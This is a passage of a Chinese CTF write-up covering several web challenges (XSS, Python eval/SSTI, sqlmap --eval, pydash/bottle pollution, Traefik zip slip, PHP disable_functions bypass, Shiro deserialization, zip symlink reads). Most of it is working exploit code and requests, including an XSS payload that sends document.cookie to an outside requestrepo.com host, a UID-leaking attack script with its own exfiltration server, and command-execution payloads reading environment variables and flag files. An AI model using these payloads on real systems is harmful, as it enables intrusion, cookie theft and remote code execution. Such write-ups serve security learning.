class="keyword">while</span> <span class="built_in">len</span>(current_uid) &lt; <span class="number">36</span> <span class="keyword">and</span> attack_running:</span><br><span class="line">        detected_chars.clear()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[*] 当前UID: <span class="subst">&#123;current_uid&#125;</span> (长度: <span class="subst">&#123;<span class="built_in">len</span>(current_uid)&#125;</span>)&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建并提交payload</span></span><br><span class="line">        first_id = create_first_payload(cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> first_id:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        second_id = create_second_payload(first_id, cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> second_id:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        report_note(second_id, cookie)</span><br><span class="line">        time.sleep(<span class="number">2</span>)  <span class="comment"># 等待泄漏结果</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 处理检测到的字符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(detected_chars) == <span class="number">1</span>:</span><br><span class="line">            new_char = detected_chars.pop()</span><br><span class="line">            current_uid += new_char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 找到新字符: <span class="subst">&#123;new_char&#125;</span>，更新后UID: <span class="subst">&#123;current_uid&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 自动添加连字符</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(current_uid) <span class="keyword">in</span> [<span class="number">8</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">23</span>]:</span><br><span class="line">                current_uid += <span class="string">&#x27;-&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 未找到有效字符或多个匹配: <span class="subst">&#123;detected_chars&#125;</span>，重试...&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 攻击完成，最终UID: <span class="subst">&#123;current_uid&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 启动Flask API服务线程</span></span><br><span class="line">        flask_thread = Thread(</span><br><span class="line">            target=<span class="keyword">lambda</span>: app.run(</span><br><span class="line">                host=EXFILTRATION_HOST,</span><br><span class="line">                port=EXFILTRATION_PORT,</span><br><span class="line">                debug=<span class="literal">False</span>,</span><br><span class="line">                use_reloader=<span class="literal">False</span></span><br><span class="line">            ),</span><br><span class="line">            daemon=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        flask_thread.start()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Flask渗出API启动在 <span class="subst">&#123;EXFILTRATION_URL&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 启动攻击流程</span></span><br><span class="line">        attack_loop()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        attack_running = <span class="literal">False</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[!] 用户中断，程序退出&quot;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h3 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h3><p>折磨，streamlit的程序卡半天</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> aria-label=<span class="string">&quot;Expression&quot;</span> aria-invalid=<span class="string">&quot;false&quot;</span> aria-required=<span class="string">&quot;false&quot;</span> autocomplete=<span class="string">&quot;&quot;</span> disabled=<span class="string">&quot;&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;text_input_2&quot;</span> inputmode=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;&quot;</span> placeholder=<span class="string">&quot;&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;st-bb st-bx st-by st-bz st-c0 st-c1 st-c2 st-c3 st-c4 st-c5 st-c6 st-b8 st-c7 st-c8 st-cu st-ca st-cb st-cc st-cd st-ce st-ae st-af st-ag st-cf st-ai st-aj st-ct st-cv st-cg st-cw st-ci&quot;</span> value=<span class="string">&quot;1+1&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>翻翻前端发现有个disabled属性，删了就可以随意calculate</p>
<p>calculate是个eval，直接ssti的东西拿来用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[0]. __subclasses__()[133].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;env&#x27;</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h3><p>感觉故意写的500分，差点没敢做</p>
<p>开局一个sqlmap框</p>
<p>直接LotL 搜到 –eval 参数可以执行python代码</p>
<p>用 <strong>import</strong>(‘os’) 绕过对空格限制即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 --<span class="built_in">eval</span> __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;env&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="display"><a href="#display" class="headerlink" title="display"></a>display</h3><p>无附件，但是摸到一个report网页</p>
<p>想来依旧是xss</p>
<p>在404 网页发现可以回显请求内容</p>
<p>翻到<strong>iframe可以引发DOM解析器重解析script标签</strong> 这一特性</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 学聪明了，这次会unicode 编码绕过了</span></span><br><span class="line">.//%0Afetch(<span class="string">&#x27;http://vk6jzc27.requestrepo.com&#x27;</span>+document.cookie);</span><br><span class="line"><span class="comment">## 然后用 iframe 裹个 script</span></span><br><span class="line">&lt;iframe srcdoc=<span class="string">&quot;&lt;script src=.//%0Afetch(&#x27;http://vk6jzc27.requestrepo.com&#x27;+document.cookie);//&gt;&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"><span class="comment">## 最后base64一下</span></span><br><span class="line"><span class="comment"># report</span></span><br><span class="line">Jmx0O2lmcmFtZSBzcmNkb2M9IiZsdDtzY3JpcHQgc3JjPS4vLyUwQWZldGNoKCdodHRwOi8vdms2anpjMjcucmVxdWVzdHJlcG8uY29tJytkb2N1bWVudC5jb29raWUpOy8vJmd0OyZsdDsvc2NyaXB0Jmd0OyImZ3Q7Jmx0Oy9pZnJhbWUmZ3Q7</span><br></pre></td></tr></table></figure>

<h3 id="ez-dash-revenge-ez-dash"><a href="#ez-dash-revenge-ez-dash" class="headerlink" title="ez_dash_revenge &amp;&amp; ez_dash"></a>ez_dash_revenge &amp;&amp; ez_dash</h3><p>不懂，还没找到非预期</p>
<p>搜一下dash rce 发现有原型链污染</p>
<p>bottle.template 有 bottle.template 可污染从而实现任意文件读</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_raise_if_restricted_key</span>(<span class="params">key</span>): </span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> RESTRICTED_KEYS:  <span class="comment"># RESTRICTED_KEYS = (&quot;__globals__&quot;, &quot;__builtins__&quot;)</span></span><br><span class="line">        <span class="keyword">raise</span> KeyError(<span class="string">f&quot;access to restricted key <span class="subst">&#123;key!r&#125;</span> is not allowed&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>翻到有限制那直接先污染过限制</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=pydash</span><br><span class="line">&#123;</span><br><span class="line">    &quot;path&quot;:&quot;helpers.RESTRICTED_KEYS&quot;,</span><br><span class="line">    &quot;value&quot;:[]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就任意文件读了,写path为 &#x2F;proc&#x2F;self render environ 可读环境变量</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval</span><br><span class="line">&#123;</span><br><span class="line">    &quot;path&quot;:&quot;__globals__.bottle.TEMPLATE_PATH&quot;,</span><br><span class="line">    &quot;value&quot;:[&quot;/proc/self&quot;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET render?path=environ</span><br></pre></td></tr></table></figure>

<p>第一遍打没打通，后面过了几个小时又复刻了就通了，怪</p>
<ul>
<li>后续</li>
</ul>
<p>反过头来看ez_dash 与 revenge的差别</p>
<p>发现对path 做了过滤 <code>blacklist=[&quot;{&quot;,&quot;}&quot;,&quot;.&quot;,&quot;%&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;_&quot;]</code></p>
<p>翻翻官方文档 <a target="_blank" rel="noopener" href="https://www.osgeo.cn/bottle/stpl.html">SimpleTemplate 模板引擎 — Bottle 0.13-dev 文档</a></p>
<p>模板引擎允许您在模板中嵌入python代码的行或块。代码行以开头 <code>%</code> 代码块被 <code>&lt;%</code> 和 <code>%&gt;</code></p>
<p>那很rce了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET render?path=% <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>+<span class="built_in">chr</span>(<span class="number">46</span>)+<span class="string">&quot;popen(&#x27;env&gt;a&#x27;)&quot;</span>)</span><br><span class="line">GET render?path=a</span><br></pre></td></tr></table></figure>

<h3 id="traefik"><a href="#traefik" class="headerlink" title="traefik"></a><strong>traefik</strong></h3><p>一个zip slip 文件覆盖 也留给 @周怡 </p>
<p>来了来了</p>
<p>treafik启动的支持上传zip文件并解压，可访问的url在dynamic.yml中做了限制</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Dynamic configuration</span></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="attr">services:</span></span><br><span class="line">    <span class="attr">proxy:</span></span><br><span class="line">      <span class="attr">loadBalancer:</span></span><br><span class="line">        <span class="attr">servers:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">  <span class="attr">routers:</span></span><br><span class="line">    <span class="attr">index:</span></span><br><span class="line">      <span class="attr">rule:</span> <span class="string">Path(`/public/index`)</span></span><br><span class="line">      <span class="attr">entrypoints:</span> [<span class="string">web</span>]</span><br><span class="line">      <span class="attr">service:</span> <span class="string">proxy</span></span><br><span class="line">    <span class="attr">upload:</span></span><br><span class="line">      <span class="attr">rule:</span> <span class="string">Path(`/public/upload`)</span></span><br><span class="line">      <span class="attr">entrypoints:</span> [<span class="string">web</span>]</span><br><span class="line">      <span class="attr">service:</span> <span class="string">proxy</span></span><br></pre></td></tr></table></figure>

<p>url <code>/``flag</code> 不包含在其中，故可通过zip解压覆盖dynamic.yml文件，添加 <code>/flag</code> 的访问 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">flag</span>:</span><br><span class="line">    <span class="attr">rule</span>: <span class="title class_">Path</span>(<span class="string">`/flag`</span>)</span><br><span class="line">    <span class="attr">entrypoints</span>: [web]</span><br><span class="line">    <span class="attr">service</span>: proxy</span><br></pre></td></tr></table></figure>

<p>然后访问 <code>/flag</code> ，同时添加请求头<code>X-Forwarded-For</code>为<code>127.0.0.1</code>，即可获取<code>flag</code></p>
<p>思路如上，但是本地通了，但是远程没通，奇怪@董明洋 </p>
<p>和明洋讨论之后，认为远程可能是在转到proxy时没有带上添加的XFF。故需要添加中间件，在转到proxy之前添加请求头<code>X-Forwarded-For</code>为<code>127.0.0.1</code></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="attr">middlewares:</span></span><br><span class="line">    <span class="attr">set-localhost:</span></span><br><span class="line">      <span class="attr">headers:</span></span><br><span class="line">        <span class="attr">customRequestHeaders:</span></span><br><span class="line">          <span class="attr">X-Forwarded-For:</span> <span class="string">&quot;127.0.0.1&quot;</span> <span class="comment"># 设置请求头为 127.0.0.1</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">services:</span></span><br><span class="line">    <span class="attr">proxy:</span></span><br><span class="line">      <span class="attr">loadBalancer:</span></span><br><span class="line">        <span class="attr">servers:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span> <span class="comment"># 请求都转发到 127.0.0.1:8080</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">routers:</span></span><br><span class="line">    <span class="attr">index:</span></span><br><span class="line">      <span class="attr">rule:</span> <span class="string">Path(`/public/index`)</span></span><br><span class="line">      <span class="attr">entrypoints:</span> [<span class="string">web</span>]</span><br><span class="line">      <span class="attr">service:</span> <span class="string">proxy</span></span><br><span class="line">    <span class="attr">upload:</span></span><br><span class="line">      <span class="attr">rule:</span> <span class="string">Path(`/public/upload`)</span></span><br><span class="line">      <span class="attr">entrypoints:</span> [<span class="string">web</span>]</span><br><span class="line">      <span class="attr">service:</span> <span class="string">proxy</span></span><br><span class="line">    <span class="attr">flag:</span></span><br><span class="line">      <span class="attr">rule:</span> <span class="string">&quot;Path(`/flag`)&quot;</span> <span class="comment"># 匹配路径 /public/upload</span></span><br><span class="line">      <span class="attr">entryPoints:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">web</span></span><br><span class="line">      <span class="attr">service:</span> <span class="string">proxy</span></span><br><span class="line">      <span class="attr">middlewares:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">set-localhost</span> <span class="comment"># 使用中间件设置请求头</span></span><br></pre></td></tr></table></figure>

<h3 id="Execute"><a href="#Execute" class="headerlink" title="Execute"></a>Execute</h3><p>无附件</p>
<p>在线执行php代码，<code>system</code>函数被禁用</p>
<p>使用反射函数 <code>call_user_func</code> 绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">call_user_func(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;ls /&#x27;</span>);</span><br><span class="line">call_user_func(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;cat /flag_01wgykro&#x27;</span>); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>获取flag：<code>flag{c432692e-d4f5-4f44-b6d7-e7d29c989658}</code></p>
<p>后续验证，使用字符串拼接、反射函数等都可以绕过：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 变量函数</span><br><span class="line"><span class="variable">$f</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span>(<span class="string">&#x27;ls /&#x27;</span>); </span><br><span class="line"></span><br><span class="line">// 反射函数</span><br><span class="line"><span class="variable">$func</span> = new ReflectionFunction(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="variable">$func</span>-&gt;invoke(<span class="string">&#x27;ls /&#x27;</span>); </span><br><span class="line"></span><br><span class="line">// 字符串拼接</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;syst&#x27;</span> . <span class="string">&#x27;em&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>(<span class="string">&#x27;whoami&#x27;</span>);           // ✅ 可能绕过</span><br><span class="line"></span><br><span class="line">// 使用数组</span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$func</span> = implode(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$func</span>(<span class="string">&#x27;cat /flag&#x27;</span>);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Playground"><a href="#Playground" class="headerlink" title="Playground"></a>Playground</h3><p>和execute一样，反射函数也被禁用了</p>
<p>使用数组绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$func</span> = implode(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$func</span>(<span class="string">&#x27;ls /&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span>(<span class="string">&#x27;cat /f1ag_203138195032663&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>flag{4a1f7a77-dc34-4cd0-8b0d-1895b040542d}</p>
<h3 id="EzLogin"><a href="#EzLogin" class="headerlink" title="EzLogin"></a>EzLogin</h3><p>看见没有用的登陆框，先做目录扫描，发现存在actuactor目录</p>
<p>下载heapdump</p>
<p>用工具小搜一下关键信息找到shirokey</p>
<p><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider/releases">Releases · whwlsfb&#x2F;JDumpSpider</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">java.exe -jar C:\Users\Anonymous\Desktop\ONE-FOX集成工具箱_V7公开版_by狐狸\gui_scan\headdump\heapdump_tools.jar C:\Users\Anonymous\Desktop\ONE-FOX集成工具箱_V7公开版_by狐狸\gui_scan\headdump\heapdump</span><br><span class="line"></span><br><span class="line">&gt; shirokey</span><br><span class="line">&gt;&gt; 8Lba1JngJ7WFiaZxdeeldw==</span><br><span class="line"><span class="comment"># 工具之间亦有高下</span></span><br><span class="line">java.exe -jar JDumpSpider-<span class="number">1.1</span>-SNAPSHOT-full.jar heapdump</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">CookieRememberMeManager(ShiroKey)</span><br><span class="line">-------------</span><br><span class="line">algMode = GCM, key = fdJykP5fxv7Su40HchUcLQ==, algName = AES</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">OriginTrackedMapPropertySource</span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个出来的shirokey 是正确的</span></span><br></pre></td></tr></table></figure>

<p>继续工具shiro一把梭</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2/releases/tag/4.7.0">Release 修复低版本jdk不兼容的问题 · SummerSec&#x2F;ShiroAttack2</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[++] 存在shiro框架！</span><br><span class="line">[++] 找到key：fdJykP5fxv7Su40HchUcLQ==</span><br><span class="line">[+] 爆破结束</span><br><span class="line">[++] 发现构造链:CommonsBeanutilsString  回显方式: TomcatEcho</span><br><span class="line">[++] 请尝试进行功能区利用。</span><br><span class="line"><span class="comment"># cat /flag</span></span><br><span class="line"><span class="comment"># flag&#123;5acf6c19-7d5a-40e9-901f-009d030be803&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="LoginLogin"><a href="#LoginLogin" class="headerlink" title="LoginLogin"></a>LoginLogin</h3><p>额，跟EzLogin一样</p>
<h3 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h3><p>提供功能：上传压缩文件、成功解压后可以下载</p>
<p>flag 存放在根目录，文件名带随机字符：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RAND=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&#x27;a-zA-Z0-9&#x27;</span> | <span class="built_in">head</span> -c 32)</span><br><span class="line">FLAG_FILE=<span class="string">&quot;/flag-<span class="variable">$RAND</span>.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$FLAG_FILE</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> FLAG</span><br><span class="line"><span class="built_in">export</span> FLAG=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>upload 关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="comment"># 从session中获取当前用户的 role</span></span><br><span class="line">        role = session[<span class="string">&quot;role&quot;</span>]</span><br><span class="line">        <span class="comment"># admin 则可指定 dirname，否则随机文件夹名</span></span><br><span class="line">        <span class="keyword">if</span> role == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            dirname = request.form.get(<span class="string">&quot;dirname&quot;</span>) <span class="keyword">or</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dirname = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="comment"># 拼接 UPLOAD_FOLDER（workdir/uploads）和 dirname</span></span><br><span class="line">        target_dir = os.path.join(UPLOAD_FOLDER, dirname)</span><br><span class="line">        os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        zip_path = os.path.join(target_dir, <span class="string">&quot;upload.zip&quot;</span>)</span><br><span class="line">        file.save(zip_path)</span><br><span class="line">        <span class="comment"># 将解压文件存放在 workdir/uploads/dirname/ 下</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.system(<span class="string">f&quot;unzip -o <span class="subst">&#123;zip_path&#125;</span> -d <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;解压失败，请检查文件格式&quot;</span></span><br><span class="line"></span><br><span class="line">        os.remove(zip_path)</span><br><span class="line">        <span class="comment"># 文件下载地址 /download/dirname</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;解压完成！&lt;br&gt;下载地址: &lt;a href=&#x27;<span class="subst">&#123;url_for(<span class="string">&#x27;download&#x27;</span>, folder=dirname)&#125;</span>&#x27;&gt;<span class="subst">&#123;request.host_url&#125;</span>download/<span class="subst">&#123;dirname&#125;</span>&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>利用解压软链接可读任意文件</p>
<p>利用解压软链接也可以读取任意文件夹，但是由下载路径的不同只有admin用户才能读任意文件夹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin 可以读文件夹</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">folder</span>):</span><br><span class="line">    target_dir = os.path.join(UPLOAD_FOLDER, folder)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    files = os.listdir(target_dir)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;download.html&quot;</span>, folder=folder, files=files)</span><br><span class="line"><span class="comment"># user 只能读文件</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;/&lt;filename&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">folder, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_FOLDER, folder ,filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">        <span class="keyword">return</span> Response(</span><br><span class="line">            content,</span><br><span class="line">            mimetype=<span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;Content-Disposition&quot;</span>: <span 